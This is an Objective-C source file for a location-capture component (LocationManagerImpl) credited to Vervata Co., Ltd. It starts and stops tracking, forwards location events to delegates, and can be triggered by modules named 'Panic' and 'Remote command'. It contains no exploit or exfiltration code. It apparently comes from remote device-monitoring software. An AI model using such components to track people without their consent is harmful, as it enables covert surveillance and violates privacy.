/**
 - Project name :  LocationManager Component
 - Class name   :  LocationCaptureManager
 - Version      :  1.0  
 - Purpose      :  For LocationManager Component
 - Copy right   :  28/10/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "LocationManagerImpl.h"
#import "FxLocationEvent.h"
#import "FxEventEnums.h"
#import "LocationManagerWifiStatus.h"
#import "LocationCaptureOperation.h"
#import "EventDelegate.h"
#import "AppContext.h"
#import "DefStd.h"

@interface LocationManagerImpl (private)
- (id) init;
- (void) runTrackingOperation;
- (void) setTimeOutInterval:(NSUInteger) aTimeOutInterval;
- (void) capturedLocation;
- (void) cancelAllOperations;
- (NSString *) callingModuleString;
- (void) sendLocationEvent;
- (void) didLocationTimeout;
- (void) setIntervalTime: (NSUInteger) aIntervalTime;
- (void) setLocationServicesActiveTime: (NSUInteger) aActiveTime;
@end

@implementation LocationManagerImpl

@synthesize mIntervalTime;
@synthesize mLocationServicesActiveTime;
@synthesize mLocationManagerDelegate;
@synthesize mEventDelegate;
@synthesize mLocationEvent;
@synthesize mAppContext;
@synthesize mThreshold;
@synthesize mCallingModule;

/**
 - Method name: init
 - Purpose: This method is used for Initializing LocationManager Class
 - Argument list and description: No argument.
 - Return type and description:id(LocationManager object)
*/

- (id) init {
	self = [super init];
	if (self != nil) {
		DLog(@"init")
		[self setMLocationServicesActiveTime:180]; // 3 minutes by default
		[self setMThreshold:DEFAULT_THRESHOLD];
		[self setMCallingModule:kGPSCallingModuleCoreTrigger];
		DLog(@"mThreshold now: %ld", (long)[self mThreshold])
	}
	return self;
}

#pragma mark -
#pragma mark============= LocationManager methods Implemention==================

/**
 - Method name: setLocationManagerDelegate
 - Purpose:  This method is used to set the delegate object for which class implementing the LocationManager
 - Argument list and description:aDelegate(LocationManager instance)
 - Return type and description: No Return
*/

- (void) setLocationManagerDelegate: (id) aDelegate {
	self.mLocationManagerDelegate = aDelegate; 
}

- (void) setEventDelegate: (id <EventDelegate>) aDelegate {
	self.mEventDelegate = aDelegate;
}

/**
 - Method name: startTracking
 - Purpose:  This method is used for start the tracking Opeartion
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) startTracking {
	DLog(@"start Tracking");
	/*
	 Thank to New (Androi software developer) who discover this issue....
	 - We connot cancel this method which lead to the problem that we cannot stop location after issue: startTracking and stopTracking
	 synchronously.
	 */
	//[self performSelectorOnMainThread:@selector(runTrackingOperation) withObject:nil waitUntilDone:NO];
	
	[self performSelector:@selector(runTrackingOperation) withObject:nil afterDelay:0.1];
	DLog(@"DONE startTracking")
}

/**
 - Method name: stopTracking
 - Purpose: This method is used to stop the tracking operation.
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

-(void) stopTracking {
	DLog(@"stopTracking....");
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(runTrackingOperation) object:nil];
	[self cancelAllOperations];
	DLog(@"DONE stopTracking")
}

/**
 - Method name: getCurrentLocationOnDemand
 - Purpose:  Invoked when the  user is demanded for the location.
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) getCurrentLocationOnDemand {
	DLog(@"getCurrentLocationOnDemand....");
   	[self sendLocationEvent];
}


#pragma mark -
#pragma mark======= Implementions of LocationManagerImpl private  methods============


/**
 - Method name: runTrackingOperation
 - Purpose: This method is used to run the tracking operation on the queue.
 - Argument list and description: No argument.
 - Return type and description: No Return
*/
- (void) runTrackingOperation {  
	DLog(@"run Tracking");
	[self cancelAllOperations];
	if(mCaptureOperation) {
		[mCaptureOperation release];
		mCaptureOperation=nil;
    }
	mCaptureOperation = [[LocationCaptureOperation alloc] initWithTarget:self];
	[mCaptureOperation setMDidFinishSelector:@selector(capturedLocation)];
	[mCaptureOperation setMDidUpdateSelector:@selector(updateLocation:)];
	[mCaptureOperation setMDidFailureSelector:@selector(trackingFailure:)];
	[mCaptureOperation setMDidLocationTimeoutSelector:@selector(didLocationTimeout)];
	[mCaptureOperation run];
}


/**
 - Method name: setTimeOutInterval
 - Purpose:  This method is used to set the timeout for tracking
 - Argument list and description: aTimeOutInterval(floadt).
 - Return type and description: No Return
 */

- (void) setTimeOutInterval:(NSUInteger) aTimeOutInterval {
	self.mIntervalTime = aTimeOutInterval;
}

/**
 - Method name: capturedLocation
 - Purpose: This method is invoked when location is need to sent. 
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

-(void)capturedLocation {
	[self sendLocationEvent];
	DLog(@"Location send...with calling moudle = %@", [self callingModuleString]);
    
    #ifdef IOS_ENTERPRISE
    //[[NSNotificationCenter defaultCenter] postNotificationName:kSignificantLocationChangesNotification object:nil];
    #endif
}


/**
 - Method name: cancelAllOperations
 - Purpose:  This method is used to cancel the running Operations.
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

-(void)cancelAllOperations {
	DLog(@"cancelAllOperations....");
	if(mCaptureOperation!=nil) {
		[mCaptureOperation cancelCurrentOperation];
		[mCaptureOperation release];
		mCaptureOperation = nil;
		self.mLocationEvent=nil;
	}
}

- (NSString *) callingModuleString {
	NSString *callingModule = @"No calling module specified";
	switch ([self mCallingModule]) {
		case kGPSCallingModuleCoreTrigger:
			callingModule = @"Core trigger";
			break;
		case kGPSCallingModulePanic:
			callingModule = @"Panic";
			break;
		case kGPSCallingModuleAlert:
			callingModule = @"Alert";
			break;
		case kGPSCallingModuleRemoteCommand:
			callingModule = @"Remote command";
			break;
		case kGPSCallingModuleGeoStamping:
			callingModule = @"Geo stamping";
			break;
		default:
			break;
	}
	return (callingModule);
}


/**
 - Method name: sendLocation
 - Purpose:  This method is used to send the captured location to AppController or caller
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

-(void) sendLocationEvent {
	if (([[self mEventDelegate] respondsToSelector:@selector(eventFinished:)]) && (self.mLocationEvent!=NULL)) {
		[[self mEventDelegate] performSelector:@selector(eventFinished:) withObject:self.mLocationEvent];
	}
	if (([[self mLocationManagerDelegate] respondsToSelector:@selector(updateCurrentLocation:)]) && (self.mLocationEvent!=NULL)) {
		[[self mLocationManagerDelegate] performSelector:@selector(updateCurrentLocation:) withObject:self.mLocationEvent];
	}
	if (mLocationEvent == nil) {
		DLog(@"location is nil")
	}
	[self setMLocationEvent:nil];
}

- (void) didLocationTimeout {
	DLog (@"--- didLocationTimeout --- [self mLocationEvent] = %@", [self mLocationEvent])
	// mEventDelegate is PanicManager	
	if ([mEventDelegate respondsToSelector:@selector(locationTimeout)] && mLocationEvent == nil) {
		DLog (@"calling location delegate")
		[mEventDelegate performSelector:@selector(locationTimeout)];		// Method in UndetermineLocationDelegate protocol
	}
}

#pragma mark LocationManagerDelegate

/**
 - Method name: updateLocation
 - Purpose: This method is invoked when new Location is available. 
 - Argument list and description: aLocationEvent(FxLocationEvent).
 - Return type and description: No Return
 */

-(void) updateLocation: (FxLocationEvent *) aLocationEvent{
	self.mLocationEvent = aLocationEvent;
	DLog(@"Location updated...%@ with calling moudle = %@", aLocationEvent, [self callingModuleString]);
}

/**
 - Method name: trackingFailure
 - Purpose:  This method is invoked when tracking error is occured.
 - Argument list and description: aError (NSError).
 - Return type and description: No Return
 */

- (void) trackingFailure: (NSError *) aError { 
	DLog(@"Tracking error occured:%@",[aError description]);
	[self runTrackingOperation];
	
	if ([mLocationManagerDelegate respondsToSelector:@selector(trackingError:)]) {
		[mLocationManagerDelegate performSelector:@selector(trackingError:) withObject:aError];
	}
	
	// Simulate timeout
	[self didLocationTimeout];
}
	

#pragma mark ============== LocationCaptureOptions methods=======================

/**
 - Method name: setIntervalTime
 - Purpose:  This method is used to set the interval time for tracking
 - Argument list and description: aIntervalTime(int).
 - Return type and description: No Return
*/	

- (void) setIntervalTime: (NSUInteger) aIntervalTime {
	self.mIntervalTime = aIntervalTime;
}


/**
 - Method name: setLocationServicesActiveTime
 - Purpose:  This method is used to set the Active time for LocationServices
 - Argument list and description: aActiveTime(LocationServicesActiveTime).
 - Return type and description: No Return
*/	

- (void) setLocationServicesActiveTime: (NSUInteger) aActiveTime {
	self.mLocationServicesActiveTime =aActiveTime;
}


#pragma mark============== Memory Management methods==============================

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description:No Argument 
 - Return type and description: No Return
*/

-(void) dealloc {
	DLog (@"LocationManagerImpl is dealloced")
	[self stopTracking];
	[mEventDelegate release];
	[mLocationEvent release];
	[mCaptureOperation release];
	[super dealloc];

}

@end

